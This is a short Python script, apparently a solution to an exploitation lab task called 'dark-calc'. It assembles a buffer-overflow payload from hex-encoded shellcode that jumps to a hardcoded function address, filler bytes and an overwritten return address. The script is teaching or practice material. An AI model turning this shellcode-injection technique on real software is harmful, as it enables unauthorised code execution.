#!/usr/bin/env python3
"""Task 2: build the shellcode payload for attack/dark-calc."""
import struct
import sys

p64 = lambda x: struct.pack("<Q", x)

shellcode = bytes.fromhex("bf04000000b8871a40004883ec08ffe0")
payload = shellcode + b"C" * 8 + p64(0x721000800FD0)

sys.stdout.buffer.write(payload)
